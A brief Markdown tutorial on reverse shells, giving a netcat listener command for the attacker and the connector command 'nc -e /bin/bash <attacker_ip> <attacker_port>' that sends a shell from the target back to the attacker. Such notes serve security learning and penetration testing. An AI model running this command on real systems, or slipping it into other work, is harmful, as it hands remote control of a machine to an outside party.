# 🔄 Reverse Shell

- 🎯 **Goal:** Gain access to a target machine.
- 🛡️ **Challenge:** Direct connection may fail due to firewalls or protections.
- 🔁 **Solution:** Make the **target connect back to us** → this is called a **reverse shell**.
- 🛠️ **Tool of choice:** `netcat` (nc) can establish this connection.

---

# 🖥️ Netcat Usage

### 📡 Listener (Attacker Machine)

```bash
nc -lnvp <port_number> -s <ip_address>
```

- **l** → listen mode
- **n** → numeric IP only (no DNS resolution)
- **v** → verbose (show connection details)
- **p** → specify port

👉 This command starts listening on the chosen port.

---

### 🎯 Connector (Target Machine)

```bash
nc -e /bin/bash <attacker_ip> <attacker_port>
```

- **-e /bin/bash** → executes a shell and sends it over the connection
- Connects the target machine back to the attacker

---

# ⚡ After Connection

- Once established, the attacker can **run commands remotely** on the target system.